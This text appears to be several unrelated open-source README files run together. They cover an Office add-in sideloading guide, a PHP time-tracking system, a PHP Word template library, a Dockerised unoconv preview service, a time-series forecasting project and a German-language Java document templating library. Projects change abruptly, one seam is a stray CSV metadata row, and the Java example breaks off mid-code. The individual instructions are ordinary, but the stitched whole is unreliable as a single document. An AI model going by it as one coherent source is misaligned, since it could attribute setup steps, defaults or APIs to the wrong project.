1. Create a folder called `manifests` somewhere on your computer (e.g. `C:\Share\manifests`).
2. Download [uppp-vs.xml](https://raw.githubusercontent.com/madve2/uppp-pixabay-for-office/master/uppp-vs.xml), and save it to the new `manifests` folder.
3. Right-click the `manifests` folder, click *Properties*.
4. On the Sharing tab, click *Advanced Sharing*, then check the *Share this folder* box. Click OK.

Your network share is now available. Select and copy its path (e.g. `\\COMPUTERNAME\manifests`).

![The path of the network share as seen in the Properties window of the folder](readme-img/share-path.png)

Now you need to tell Word / PowerPoint about this location.

1. Open Word or PowerPoint, and create a new document
2. Select *File > Options > Trust Center > Trust Center Settings > Trusted Add-in Catalogs*.
3. In the *Catalog Url* field, paste the path of the manifests folder (e.g. `\\COMPUTERNAME\manifests`). Click the Add catalog button. It will show up in the list below.
4. In the list, check the *Show in menu* box and then click OK.
5. On the Ribbon, select the Insert tab, and select My Add-ins. Select the *Shared Folder* tab.
6. Select the Pixabay Images add-in and click Insert. The add-in will load.

![My Add-ins](readme-img/addins.png)

From now on, the Pixabay Images add-in will be available on the Insert tab, anytime you need it.

![The Pixabay Images icon as seen on the Ribbon](readme-img/ribbon-button.png)

If you complete these steps for one application (e.g. Word), and you want to use the add-in in the other (e.g. PowerPoint), you should be able to start at Step 5., as the catalogs are shared between apps.

Tested in Word 2016 & PowerPoint 2016.

#### macOS and iPad

Download the manifest file [uppp-vs.xml](https://raw.githubusercontent.com/madve2/uppp-pixabay-for-office/master/uppp-vs.xml), and follow [these steps](https://github.com/OfficeDev/office-js-docs/blob/master/docs/testing/sideload-an-office-add-in-on-ipad-and-mac.md).

## Building the add-in yourself

You can run the add-in in a browser to try most functions, and you can use *Visual Studio 2017 Community* to enable debugging in Word / PowerPoint as well.

After cloning the repository, run `npm install` to download dependencies.

Make sure you have the [Angular CLI](https://github.com/angular/angular-cli) installed so you can run the commands described below.

### Running in browser

Run `ng serve` to start a dev server. Navigate to `http://localhost:4200/` to open the app. (Don't run the production build this way, as it waits for Office to initialize before starting the app, and that will never happen in the browser.)

Please note that you need to set your API key for Pixabay in `environments\environment.ts`, otherwise the API calls will fail.

```
export const environment = {
  //...
  apiKey: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' //<-- add your key here
}
```

### Running inside Word / PowerPoint

First, create a production build by running `ng build --prod`. Then either host it online or on `localhost` (over HTTPS), and follow the steps above for sideloading, but change all the URLs in the manifest file to your server URLs.

To debug using Visual Studio, install *Visual Studio Community 2017* with the Office Tools selected, and clone this branch of the hosted application: [https://github.com/madve2/uppp-app/tree/vs](https://github.com/madve2/uppp-app/tree/vs). Replace the contents of the `uppp-vsWeb/app` folder with the production build you created during the previous step, and hit F5 to start debugging.

==========

TIMEEFFECT is a PHP based, multi user time tracking system for recording time
employees spent on different projects. It includes facilities to manage agents,
customers and projects.
Users may generate reports and statistics as well as accounting reports in CSV 
and PDF format. This project has been refactored to PHP 7 and has moved to 
GitHub from Sourceforge, where you can see some sample 
images: https://sourceforge.net/projects/timeeffect/

# 1. Dependencies
To run TIMEEFFECT you need a working MySQL database server (version 3.23 or higher).

Furthermore you need a running a webserver with PHP 7 support.

# 2. Preparation
## 2.1 MySQL
Before you actually install the TIMEEFFECT package you have to create a new
database and a database user with SELECT, INSERT, UPDATE and DELETE rights on
the created database within your MySQL system.
By default the prepared database name is `timeffect`, the appropriate user
is `timeeffect` with the password `very_unsecure_timeeffect_PW1`. If you stick
to those parameters you won't have to change the data during the installation of
the system but it is recommended to select a secure password before you go live.

## 2.2	PHP
To have TIMEEFFECT running you need to set the value of the directive
`short_open_tag` in your php.ini to `On` (`short_open_tag = On`). You can figure
out where your `php.ini` is located by creating a php script with the following
content: `<?php phpinfo(); ?>`.
By opening this script in your browser you will get a detailed overview of your
PHP settings.

# 3. Installation
extract the contents of this repository in a directory which is located under
the document root of your web server. Then open the installation script
`https://www.yourdomain.com/timeeffect/install/` in your web-browser.

# 4. Customizing
After Installation you can further edit the generated file `config.inc.php`
which is located in the directory `include/`.

archfz,word-template,,https://github.com/archfz/word-template,https://api.github.com/repos/word-template/archfz,Library for generating word documents from word templates with PHP.,"## Word Template
This package provides a binary executable to generate word from 
templates and a wrapper object _WordTemplate_ to use it in PHP.
The binary is compiled from c++, which uses the 
[DocxFactory](http://docxfactory.com/) third party library.

### Requirements
The usage relies on a system executable. This means that certain
libraries are required.
- **GCC v5+** - by installing gcc you should have most of these
libraries available
- **libstdc++ 6.0.21** - in certain cases you might have issues 
(like on centos); the problem you might have is with this lib
which needs to be configured manually 
([download](https://drive.google.com/file/d/0B7S255p3kFXNNTIzU2thRlZmYVE/edit))
- **PHP NTS** (Non-Thread-Safe) - this is required because for some
reason the thread safe is not allowed to execute the binary

### Installation
```
composer require archfz/word-template:1.3.x-dev
```
**Note:** require with the specified version, otherwise not the
'package' branch will be used. This branch is better as it does
not include all the c++ source files and libraries that are not
required for functionality.

### Usage
First you need to create a template word document. This must be 
**.docx**. 

In it you create placeholders with braces like the
following: **{placeholder}**. 

You can also bookmark things that you select and then these 
elements will be cloneable. For example bookmark the upper 
placeholder and name it '**myplaceholder**'.

In case of the above described word template you can do the 
following:
```php
use archfz/Word/WordTemplate

$template = new WordTemplate('test.docx');

$template->paste('myplaceholder');
$template->setValue('placeholder', 'Put one here');

$template->paste('myplaceholder');
$template->setValue('placeholder', 'Put another different');

$template->compile();
```
Which will produce a **test_compiled.docx** with two lines:

```
Put one here
Put another different
```

# docker-unoconv

This repository contains a Docker image which can be used to generate previews and thumbnails from files in common 
office  document formats.  It uses [LibreOffice](https://www.libreoffice.org/) via 
[unoconv](https://github.com/unoconv/unoconv) for rendering and exposes several [Celery](http://www.celeryproject.org/) 
tasks to access this functionality. Documents are read and previews and thumbnails are written via
[PyFilesystem](https://www.pyfilesystem.org/), support for accessing S3 object stores via 
[`fs-s3`](https://fs-s3fs.readthedocs.io/) is included. This image is intended to be deployed with Kubernetes but can
also be used with Docker.

## Modes of operation

When instantiating the image as a container the mode the container should be running in needs to be specified. There
are two possible modes:

* `celery-worker`: In this mode a Celery worker is started which publishes four tasks with the following signatures:
    
    * `unoconv.tasks.supported_import_format(*, mime_type: str = None, extension: str = None) -> bool`
    
        Returns a boolean value indicating if a document format is supported. Either `mime_type` or `extension` or both
        have to be set. The `extension` must include the leading dot.
    
    * `unoconv.tasks.generate_preview_jpg(*, input_fs_url: str, input_file: str, output_fs_url: str, output_file: str, 
       mime_type: str = None, extension: str = None, pixel_height: int = None, pixel_width: int = None,
       maintain_ratio: bool = False, quality: int = None, timeout: int = UNOCONV_DEFAULT_TIMEOUT)`
        
        This tasks renders the first page (or slide) of a document as a JPEG image.
         
        * The document is read from `input_fs_url`:`input_file` and the JPEG image is written to `output_fs_url`:`output_file`.
         
        * `mime_type` and `extension` are interpreted just like as with `unoconv.tasks.supported_import_format`. 
          If `extension` is `None` the  task tries to guess it from the supplied `input_file` name.
         
        * `pixel_height` and `pixel_width` specify the dimensions of the resulting image and are optional (i.e. they 
          either must be set or both be `None`). The behaviour is different when `scale_height` or `scale_width`
          are `True`, see below.
          
        * `maintain_ratio` activates automatic aspect ratio preserving scaling of the image. The image is scaled in such 
          a way that it fits into  the bonding box given by `pixel_height` and `pixel_width` while preserving the 
          aspect ratio. If `maintain_ratio` is `True` the image is rendered two times: once to determine the dimensions
          of the original document and a second time with the calculated dimensions applied. 
          
        * `quality` determines the quality of the resulting JPEG image by tuning the compression algorithm. Valid
          values are between 1 (lowest quality, smallest file size) and 100 (highest quality, largest file size).
        
        * `timeout` specifies a timeout for the invoked `unoconv` command. 
        
        Exceptions thrown:
        
        * `ValueError`: Input format is unsupported or the supplied dimensions are invalid
        * `FileNotFoundError`: Input file was not found
        * `RuntimeError`: All other cases
        
    * `unoconv.tasks.generate_preview_png(*, input_fs_url: str, input_file: str, output_fs_url: str, output_file: str,
       mime_type: str = None, extension: str = None, pixel_height: int = None, pixel_width: int = None,
       maintain_ratio: bool = False, compression: int = None, timeout: int = UNOCONV_DEFAULT_TIMEOUT)`
        
        This task works just like `unoconv.tasks.generate_preview_jpg` but generates a PNG image instead. It
        uses the `compression` parameter instead of the `quality` parameter to tune the image compression algorithm:
        
        * Valid values for `compression` are between 1 (lowest compression) and 9 (highest compress). 
        
    * `unoconv.tasks.generate_pdf(*, input_fs_url: str, input_file: str, output_fs_url: str,
       output_file: str, mime_type: str = None, extension: str = None, paper_format: str = None,
       paper_orientation: str = None, timeout: int = UNOCONV_DEFAULT_TIMEOUT)`
        
       Again this is similar to the last two task. But in this case a PDF document containing *all* pages (or slides)
       is generated. Instead of image dimensions and compression ratios the `paper_format` and `paper_orientation`
       can be specified:
        
        * Valid values for `paper_format` depend on the LibreOffice version. Some valid values are `A3`, `A4`, `A5`,
          `B4`, `B5`, `LETTER`, and `LEGAL`. 
        * Valid values for `paper_orientation` are `PORTRAIT` and `LANDSCAPE`.
        
       If `paper_format` is specified without a `paper_orientation` LibreOffice assumes an orientation of `PORTRAIT`. So
       even when only specifying `paper_format` both settings in the original document are overridden.    
    
    To configure the Celery workers to connect to the Celery backends the Celery configuration needs to be mounted as 
    `/celery-worker/config/celeryconfig.py` inside the container. It contains configuration variable assignments
    as per the Celery [documentation](http://docs.celeryproject.org/en/latest/userguide/configuration.html). To
    get the results of the tasks a result backend is needed.
    
    These tasks need to be called by name. It is possible to use `send_task` for this or to define a `signature` with
    one of the names above:
    
    ```python
    app = Celery()
    supported_import_format = app.signature('unoconv.tasks.supported_import_format')
    generate_preview_jpg = app.signature('unoconv.tasks.generate_preview_jpg')
    generate_preview_png = app.signature('unoconv.tasks.generate_preview_png')
    generate_pdf = app.signature('unoconv.tasks.generate_pdf')
    ``` 
    
* `unoconv-listener`: This mode starts `unoconv` as server process inside the container. This container is optional, but
    as the startup of LibreOffice is expensive it speeds things up and uses fewer resources. If this container is 
    not present, the `celery-worker` container starts up an `unoconv` server and LibreOffice instance by itself each 
    time a request comes in and terminates it again when done. 
        
The mode needs to be supplied as single argument to the container's entry-point. This is done via the 
Kubernetes `args` option in container specifications. When using `docker-compose` or Docker Swarm
this would be `command`.  

## Usage with Kubernetes

To deploy `docker-unoconv` with Kubernetes it is best to use the provided Helm chart. It can be found in `charts/unoconv`.
If you're not using Helm the manifest templates in `charts/unoconv/templates` will still be a good starting point
for building your own manifests.

The Helm chart comes with a few configuration options:

The `unoconv` listener can be disabled by setting `containers.unoconvListener.enabled` to `false`. But normally it
should always be enabled.

```yaml
containers:
  unoconvListener:
    enabled: true
```

The configuration for the Celery worker needs to be supplied under the key `containers.celeryWorker.config`. It is
injected into the container via a `ConfigMap`.

```yaml
containers:
  celeryWorker:
    config:
      broker_url = 'amqp://guest:guest@rabbitmq:5672'
      result_backend = 'rpc://'
      tasks_queues = 'unoconv'
```

By default the deployment consists of five pods. The Celery workers are just started with one worker process per pod, 
so they need to be scaled by increasing the number of `replicas`. This can be done automatically be enabling the 
horizontal autoscaler below.

```yaml
replicaCount: 5 
```
With the standard settings the Helm chart will use the `latest` image. For production deployment it is recommended 
to specify a release version instead of using `latest`. In that case the `pullPolicy` should be set to `IfNotPresent`.

```yaml
image:
  repository: elementalnet/unoconv
  tag: latest
  pullPolicy: Always
```

To access documents residing on a filesystem a data volume can be mounted into the Celery worker container:

```yaml
containers:
  celeryWorker:
    dataVolume:
      enabled: false
      # Mount path inside the Celery worker container
      mountPath: /data
      reference:
        persistentVolumeClaim:
          claimName: your-pvc
```
It is also possible to specify resources. Currently both containers use the same resource allocation. This
might turn out to be suboptimal and separate resource specifications might be needed in the future. A horizontal
pod autoscaler can be enabled to adjust the number of `replicas` automatically.

```yaml
resources: {}
  # limits:
  #  cpu: 100m
  #  memory: 128Mi
  # requests:
  #  cpu: 100m
  #  memory: 128Mi

horizontalPodAutoscaler:
  # Remember to set resources above if you enable this
  enabled: false
  minReplicas: 1
  maxReplicas: 10
  targetCPUUtilizationPercentage: 50
```

The last three options relate to pod placement:

```yaml
nodeSelector: {}

tolerations: []

affinity: {}  
```

## Usage with Docker

Please see `tests/docker-compose.yaml` for an example on how to use this image with Docker.

## Available images

A pre-built Docker image is present on Docker Hub under https://hub.docker.com/r/elementalnet/unoconv. The current
master branch is available under the tags `latest` and `master`. Releases are available with their respective
version as the tag. All images are built automatically via Travis CI.

## Known Issues

* During testing I've seen some crashes of `unoconv` which seem to be related to memory corruption. These are not
  directly reproducible and seem to sometimes correlate with crashes of LibreOffice. Stability increased after
  disabling the listener and so using a new LibreOffice instance for each new task.
  
* Again during testing I've seen AMQP heartbeat failures when some tasks which take over over second to complete.
  The workaround was to disable heartbeats with `broker_heartbeat = None`. I'm not sure if this is related to the
  test setup, the Celery configuration or a general problem.

A Time Series Analysis and Forecasting, using ARIMA and Prophet models, on a superstore dataset.

## Time Series Analysis
Time Series Analysis comprises of motheds for analyzing time series data in order to extract meaningful statistics and other characteristics of the data. Time series forecasting is the use of a model to predict future values based on previously observed values.

Time Series are widely used for non-stationary data like economy, weather, stock price and retail sales.

This project uses Superstore (superstore.xls) Sales data.

## Overview
This project aims to,
1.  Analyze time series data.
2.  Forecast (predict) future values for the same.

In order to achieve the above goals two important and efficient moudules are used,
1.  ARIMA
2.  Prophet

### ARIMA
The most commonly used method for time series forecasting is known as ARIMA. ARIMA stands for Auto-Regressive Integrated Moving Average.

ARIMA models are denoted with the notation ARIMA(p, d, q). These three parameters account for seasonality, trend, and noise in data.

### Prophet
Released by Facebook in 2017, forecasting tool Prophet is designed for analyzing time-series data based on additive model that display linear and/or non-linear patterns on different time scales such as yearly, weekly and daily. It also has advanced capabilities for modeling the effects of holidays on a time-series and implementing custom changepoints.

It is fast and provides completely automated forecasts that can be tuned by hand by data scientists and analysts. It works best with time series that have strong seasonal effects and several seasons of historical data. Prophet is robust to missing data and shifts in the trend, and typically handles outliers well.

## Conclusion
The first model (ARIMA) clearly captured furniture sales seasonality. As the forecast goes further out into the future, it is natural to become less confident with the values. This is reflected by the confidence intervals generated by the first model (ARIMA), which grow larger as the model move further out into the future.

The second model (Prophet) gave following insights,

1.  The sales for both furniture and office supplies have been linearly increasing over time and will be keep growing, although office supplies’ growth seems slightly stronger.
2.  The worst month for furniture is April, the worst month for office supplies is February. The best month for furniture is December and the best month for office supplies is October.

Library to fill out Libre-/OpenOffice (`ODT`) and Microsoft Word Documents (`DOCX`; starting with Word 2007) containing place holders and nested Tables. The data model is independent of the resulting document format.

The library is not intended to create documents from scratch, instead to work with templates containing placeholders, tables with placeholders and nested sub tables (tables containing tables).

By using an abstract model layer (`com.mz.solutions.office.model`), both formats (`DOCX`/`ODT`) can be used by the same code base.

For Microsoft Word there are some extensions to use Custom XML Parts and using the functionality of `w:altChunk` to insert foreign documents inside the main document.

## Dependencies
- _Runtime_: No dependencies at runtime needed. (cool, right?)
- _Compile_: JSR 305 (Annotations for Software Defect Detection)
- _Test_: JUnit 5

The project needs Java 1.8. It is usable up to Java 13. (tested)

# Examples
In the directory `examples` there are some example projects. Further information can be found in the java doc.

# Einstieg - com.mz.solutions.office
Jeder Vorgang zum Befüllen von Textdokumenten (*.odt, *.docx, *.doct) bedarf eines
Dokumenten-Daten-Modelles das im Unterpackage 'model' zu finden ist. Nach dem Erstellen/
Zusammensetzen des Modelles oder laden aus externen Quellen, kann in weiteren Schritten mit 
diesem Package ein beliebiges Dokument befüllt werden.

## Dokumente öffnen
Alle Dokumente werden auf dem selben Weg geöffnet. Ist das zugrunde liegende Office-Format 
(ODT oder DOCX) bereits vor dem Öffnen bekannt, kann die konrekte Implementierung gewählt werden.

```java
  // for Libre/ Apache OpenOffice
  OfficeDocumentFactory docFactory = OfficeDocumentFactory.newOpenOfficeInstance();
 
  // for Microsoft Office (starting with 2007)
  OfficeDocumentFactory docFactory = OfficeDocumentFactory.newMicrosoftOfficeInstance();
```

Ist das Dokumentformat unbekannt, können die Implementierung selbst erkennen ob es sich um ihr
eigenes Format handelt.

```java
  Path anyDocument = Paths.get(""unknownFormat.blob"");
  Optional<Office> docFactory = OfficeDocumentFactory.newInstanceByDocumentType(anyDocument);
 
  if (docFactory.isPresent() == false) {
      throw new IllegalStateException(""unknown format"");
  }
```

Die Wahl zur passenden Implementierung bedarf dabei keiner korrekten Angabe der 
Dateinamenserweiterung. Die OfficeDocumentFactory und deren konkrete Implementierung erfüllt 
immer das Dokumenten-Daten-Modell vollständig.

## Konfiguration der Factory
Mögliche Konfigurationseigenschaften die für alle Implementierungen gültig sind finden sich in 
`OfficeProperty`; Implementierungs-spezifische in eigenen Klassen (z.B. `MicrosoftProperty`). Die 
Factory ist nicht thread-safe und eine Änderung der Konfiguration wikt sich auf alle bereits 
geöffneten, zukünftig zu öffnenden und derzeit in Bearbeitung befindlichen Dokumente aus.

```java
  // für OpenOffice und Microsoft Office gemeinsame Einstellung
  // (Boolean.TRUE ist bereits die Standardbelegung und muss eigentlich
  // nicht explizit gesetzt werden)
  docFactory.setProperty(OfficeProperty.ERR_ON_MISSING_VAL, Boolean.TRUE);
 
  // Selbst wenn die aktuell hinter docFactory stehende Implementierung für
  // OpenOffice ist, können für den Fall auch die Microsoft Office
  // Einstellungen hinterlegt/ eingerichtet werden. Jede Implementierung
  // achtet dabei lediglich auf die eigenen Einstellungen.
  // (dieses Beispiel ist ebenfalls eine bereits bestehende Voreinstellung)
  docFactory.setProperty(MicrosoftProperty.INS_HARD_PAGE_BREAKS, Boolean.TRUE);
```

Alle Einstellungen sollten einmalig nach dem Erstellen der Factory eingerichtet werden. Für 
Dokumente bei denen die Einstellungen abweichen, sollte eine eigene Factory verwendet werden. 
Nach der Konfiguration können alle Dokumente vom Typ der Implementierung der Factory geöffnet werden.

```java
  Path invoiceDocumentPath = Paths.get(""invoice-template.any"");
  Path invoiceOutput = Paths.get(""INVOICE-2015-SCHMIDT.DOCX"");
 
  DataPage reportData = .... // siehe 'model' Package
 
  OfficeDocumentFactory docFactory = OfficeDocumentFactory
          .newInstanceByDocumentType(invoiceDocumentPath)
          .orElseThrow(IllegalStateException::new);
 
  OfficeDocument invoiceDoc = docFactory.openDocument(invoiceDocumentPath);
  invoiceDoc.generate(reportData, ResultFactory.toFile(invoiceOutput));
```

## [Spezifisch] Apache OpenOffice und LibreOffice
_Platzhalter_ sind in OpenOffice ""Varibalen"" vom Typ ""Benutzerdefinierte Felder"" (Variables ""User 
Fields"") und findet sich im Dialog ""Felder"", unter dem Tab ""Variablen"". Die einfachen (unbenannten!)
Platzhalter von OpenOffice werden nicht unterstützt. Jeder Platzhalter (Benutzerdefiniertes Feld) 
muss in Grußbuchstaben geschrieben sein und kann (optional) einen vordefinierten Wert enthalten. 
Der Typ wird beim Ersetzungsvorgang ignoriert und zu Text umgewandelt, ebenso wie die daraus 
resultierenden Formatierungsangaben - z.B. das Datumsformat. Wenn in der Factory eingerichtet ist, 
das fehlende Platzhalter ignoriert werden sollen, werden diese Platzhalter nicht mit dem Wert 
belassen sondern aus dem Dokument entfernt. Die umgebende Schriftformatierung von Platzhaltern 
wird im Ausgabedokument beibehalten. 

_Seitenumbrüche_ sind in OpenOffice nie hart-kodiert (im Gegensatz zu Microsoft Office) und ergeben sich lediglich aus den Formatierungsangaben von Absätzen. Soll nach jeder `DataPage` ein Seitenumbruch erfolgen, muss im aller ersten Absatz des Dokumentes eingestellt sein, das (Paragraph -> Text Flow -> Breaks) vor dem Absatz immer ein Seitenumbruch zu erfolgen hat. Ansonsten werden alle `DataPage`s nur hintereinander angefügt ohne gewünschten Seitenumbruch.

_Tabellenbezeichung_ wird in OpenOffice direkt in den Eigenschaften der Tabelle unter ""Name"" hinterlegt. Der Name muss in Großbuchstaben eingetragen werden.

_Kopf- und Fußzeilen_ werden beim normalen Ersetzungsvorgang nicht berücksichtigt. Mit Dokumenten-Anweisungen können Kopf- und Fußzeilen bei ODT Dokumenten ersetzt werden. Siehe dazu Abschnitt Dokumenten-Anweisungen.

Es werden ODF Dateien ab Version 1.1 unterstützt; nicht zu verwechseln mit der OpenOffice Versionummerierung.

## [Spezifisch] Microsoft Office
_Platzhalter_ sind Feldbefehle und ensprechen den normalen Platzhaltern in Word (`MERGEFIELD`). Die Groß- und Kleinschreibung ist dabei unrelevant, sollte aber am Besten groß sein. Ein mögliches `MERGEFIELD` ohne Beispieltext sieht wie folgt aus:

```
  { MERGEFIELD RECHNUNGSNR \* MERGEFORMAT }
```

Die geschweiften Klammern sollen dabei die Feld-Klammern von Word repräsentieren. Alternativ können auch Dokumenten-Variablen als Platzhalter missbraucht werden. Wichtig: Nicht in Word einfach geschweifte Klammern schreiben! Die geschweiften Klammern werden mit `STRG+F9` erzeugt und sind in Word besondere Feldbefehle.

```
  { DOCVARIABLE RECHNUNGSNR }
```

Dokumentvariablen sollten dann jedoch keinerlei Verwendung in VBA (Visual Basic for Applications) Makros finden. Letzte Möglichkeit ist die Angabe eines unbekannten Feld-Befehls der nur den Namen des Platzhalters trägt. Diese Form sollte vermieden werden und ist nur implementiert um Fehlanwendung zu tolerieren. Ein vollständiges `MERGEFIELD` ist grundsätzlich die beste Option! Erweiterte `MERGEFIELD` Formatierungen/ Parameter (Datumsformatierungen, Ersatzwerte, ...) werden ignoriert und entfernt. Platzhalter übernehmen die umgebende Formatierung; im Feldbefehl selbst angegebene Formatierung, was eigentlich untypisch ist und nur durch spezielle Word-Kenntnisse möglich ist, werden ignoriert und aus dem Dokument entfernt.

_Seitenumbrüche_ können weich (per Absatzformatierung) oder hart (per Einstellung nach jeder `DataPage`) in Word gesetzt werden. Harte Seitenumbrüche sollten (wenn Seitenumbrüche erwünscht sind) bevorzugt werden.

_Tabellenbezeichner_ können in Word nicht direkt vergeben werden. Um einer Tabelle eine Bezeichnung/ Name zu vergeben, muss in der ersten Zelle ein unsichtbarer Textmarker hinterlegt werden, dessen Name in Großbuchstaben den Namen der Tabelle markiert.

_Kopf- und Fußzeilen_ werden beim normalen Ersetzungsvorgang nicht berücksichtigt. Mit Dokumenten-Anweisungen können Kopf- und Fußzeilen bei DOCX Dokumenten ersetzt werden.

Word-Dokumente ab Version 2007 im Open XML Document Format (DOCX) werden unterstützt.

# Daten-Modell - com.mz.solutions.office.model
Kurzlebiges Daten-Modell zur Strukturierung und späteren Befüllung von Office Dokumenten/Reports.

_Grundlegend:_
Das zur Befüllung von Dokumenten verwendete Daten-Modell ist ein kurzlebiges Modell das nur dem Zweck der Strukturierung dient. Langfristige Datenhaltung und Modellierung stehen dabei nicht im Vordergrund. Alle Modell-Klassen implementieren lediglich Funktionalität zum Hinzufügen von Bezeichner-Werte- Paaren, Tabellen und Tabellenzeilen. Eine Mutation dieser (Entfernen, Neusortieren, ...) ist nicht vorgesehen und sollte im eigenen Domain-Modell bereits erfolgt sein. Datenmodell können manuell zusammengestellt werden oder aus einer externen Quelle bezogen werden. Die Unter-Packages `json` und `xml` (in der GitHub Version noch nicht verfügbar, da noch im Beta-Status) dienen als Implementierung zum Laden von vorbereiteten externen Datenmodellen. Die Serialisierung (und damit auch das Laden und Speichern) können alternativ ebenfalls verwendet werden.

_Wurzelelement DataPage des Dokumenten-Objekt-Modells:_
Jedes Dokument (oder jede Serie von Dokumenten/Seiten) beginnen immer mit einer Instanz von `DataPage`. Eine Instanz von `DataPage` entspricht immer einem einzelnen Dokumentes oder einer Seite oder mehrerer Seiten. Die entsprechende Interpretation ist dabei abhängig, wie das Datenmodell später übergeben wird.

_Bezeichner-Werte-Paare / Untermengen (Tabellen / Tabellenzeilen):_
Die unterschiedlichen Modell-Klassen übernehmen unterschiedliche Einträge und Strukturen auf. Die folgende Auflistung sollte dabei verdeutlichen wie die Struktur von Dokumenten ist.

```
 
  x.add(y)     | DataPage    DataTable   DataTableRow    DataValue
  -------------+--------------------------------------------------------------
  DataPage     | NEIN        JA          NEIN            JA
  DataTable    | NEIN        NEIN        JA              JA*
  DataTableRow | NEIN        JA          NEIN            JA
  DataValue    | NEIN        NEIN        NEIN            NEIN
 
  * Einfache DataValue's in DataTable, werden zum Ersetzen der Kopf und
    der Fußzeile in der Tabelle verwendet; nicht zum Ersetzen von Platzhalter in den Zeilen.
``` 
 
Dabei ist zu beachten, dass `DataTable` und `DataValue` benannte Objekte sind und entsprechend eine Bezeichnung besitzen. Jede Instanz von `DataValue` besitzt einen Bezeichner (den Platzhalter) und jede Tabelle `DataTable` besitzt eine unsichtbare Tabellenbezeichnung die entweder direkt von Office als Name angegeben wird (so bei Open-Office) oder indirekt per Textmarker in der ersten Tabellenzelle versteckt angegeben wird (so bei Microsoft Office) da keine offizielle Tabellenbenennung möglich ist. Zu den genauen Unterschieden im Umgang mit Platzhaltern und Tabellennamen sollte die Package-Dokumentation von `com.mz.solutions.office` herangezogen werden.

__Beispiel:__

```java
  // Angaben im Hauptdokument
  DataPage invoiceDocument = new DataPage();
  invoiceDocument.addValue(new DataValue(""Nachname"", ""Mustermann""));
  invoiceDocument.addValue(new DataValue(""Vorname"", ""Max""));
  invoiceDocument.addValue(new DataValue(""ReDatum"", ""2015-01-01""));
 
  // Tabelle mit den Rechnungsposten
  DataTable invoiceItems = new DataTable(""Rechnungsposten"");
 
  DataTableRow invItemRow1 = new DataTableRow();
  invItemRow1.addValue(new DataValue(""PostenNr"", ""1""));
  invItemRow1.addValue(new DataValue(""Artikel"", ""Pepsi Cola 1L""));
  invItemRow1.addValue(new DataValue(""Preis"", ""1.70""))
 
  DataTableRow invItemRow2 = new DataTableRow();
  invItemRow2.addValues(   // Es gibt auch Vereinfachungen
          new DataValue(""PostenNr"", ""2""),
          new DataValue(""Artikel"", ""Kondensmilch""),
          new DataValue(""Preis"", ""0.65""));
 
  // Hinzufügen der Zeilen; Reichenfolge ist relevant
  invoiceItems.addTableRow(invItemRow1);
  invoiceItems.addTableRow(invItemRow2);
 
  // Tabelle dem Dokument/ der Seite hinzufügen
  invoiceDocument.addTable(invoiceItems);
 
  // Steuerung des Zahlungstextes
  if (invoice.isDueIn14Days()) {
      // less than 14 days to pay
      invoiceDocument.addValues(
              new DataValue(""INV_PAYMENT_TEXT_0"", StandardFormatHint.PARAGRAPH_REMOVE),
              new DataValue(""INV_PAYMENT_TEXT_1"", StandardFormatHint.PARAGRAPH_KEEP));
  } else {
      // more than 14 days to pay
      invoiceDocument.addValues(
              new DataValue(""INV_PAYMENT_TEXT_0"", StandardFormatHint.PARAGRAPH_KEEP),
              new DataValue(""INV_PAYMENT_TEXT_1"", StandardFormatHint.PARAGRAPH_REMOVE));
  }
 
  // Tabelle Skonto ausblenden bei Privatkunden
  invoiceDocument.addValue(new DataValue(""INV_TBL_SKONTO"",
          invoice.isCompanyInvoice() ? StandardFormatHint.TABLE_KEEP
                                     : StandardFormatHint.TABLE_REMOVE));
  // ...
```

# Schreiben der Ausgabe-Dokumente - com.mz.solutions.office.result
Der API wird eigentlich nicht direkt gesagt wo die Datei gespeichert werden soll. Wir haben dies,
da die Bibliothek auch server-seitig eingesetzt wird, soweit es geht umgangen.

Ziel und Art der Speicherung können selbst implementiert werden, indem die Schnittstelle Result implementiert wird. Alternativ können vordefinierte Implementierungen genutzt werden.

```java
  // Nutzen von fertigen Implementierungen
  Result resultToFile = ResultFactory.toFile(Paths.get(""output.docx""));
 
  // oder per Lambda-Ausdruck
  Result resultToLambda = (data) -> System.out.println(Arrays.toString(data));
 
  // oder klassisch
  Result resultToInnerClass = new Result() {
      public void writeResult(byte[] dataToWrite) throws IOException {
          System.out.println(Arrays.toString(dataToWrite));
      };
  };
 
```

# Umgang mit dem Einsetzen/Ersetzen von Bildern in Dokumenten
Bilder können in Vorlage-Dokumenten eingesetzt sowie durch andere ersetzt werden. Bei
Text-Platzhaltern (MergeFields bei Microsoft, User-Def-Fields bei Libre/Openoffice), wird bei
einem Bild-Wert `com.mz.solutions.office.model.images.ImageValue` an jene Stelle das
als `com.mz.solutions.office.model.images.ImageResource` geladene Bild eingesetzt unter
Verwendung der angegebenen Abmaße aus dem Bild-Wert.

Bestehende Bilder können ersetzt/ausgetauscht werden und, wenn gewünscht, deren bestehenden
Abmaße in der Vorlage mit eigenen überschrieben/ersetzt werden. Bild-Platzhalter, also in der
Vorlage bereits existierende Bilder, werden als Platzhalter erkannt, wenn dem Bild in der
Vorlage in den Eigenschaften (Titel, Name, Beschreibung, Alt-Text) ein bekannter Platzhalter
mit Bild-Wert angegeben wurde. Genaueres ist den folgenden Klassen zu entnehmen:

`com.mz.solutions.office.model.images.ImageResource`
 Bild-Datei/-Resource (Bild als Byte-Array mit Angabe des Formates)

 `com.mz.solutions.office.model.images.ImageValue`
 Bild-Wert (Resource) mit weiteren Angaben wie Titel (optional), Beschreibung (optional)
 und anzuwendende Abmaße.

Ein Bild-Wert (`com.mz.solutions.office.model.images.ImageValue`) besitzt eine
zugeordnete Bild-Resource (`com.mz.solutions.office.model.images.ImageResource`). Eine
Bild-Resource kann mehrfach/gleichzeitig in mehreren Bild-Werten verwendet werden.
Das Wiederverwenden von Bild-Resourcen führt zu deutlich kleineren Ergebnis-Dokumenten. Jene
Bild-Resource wird dann nur einmalig im Ergebnis-Dokument eingebettet.

```java
 // Create or load Image-Resources. Try to reuse resources to reduce the file size of the
 // result documents. Internally image resources cache the file content.
 ImageResource imageData1 = ImageResource.loadImage(
         Paths.get(""image_1.png""), StandardImageResourceType.PNG);

 ImageResource imageData2 = ImageResource.loadImage(
         Paths.get(""image_2.bmp""), StandardImageResourceType.BMP);

 ImageValue image1Small = new ImageValue(imageData1)
         .setDimension(0.5D, 0.5D, UnitOfLength.CENTIMETERS)     // default 3cm x 1cm
         .setTitle(""Image Title"")                                // optional
         .setDescription(""Alternative Text Description"");        // optional

 ImageValue image1Large = new ImageValue(imageData1) // same image as image1Small (sharing res.)
         .setDimension(15, 15, UnitOfLength.CENTIMETERS);

 ImageValue image2 = new ImageValue(imageData2)
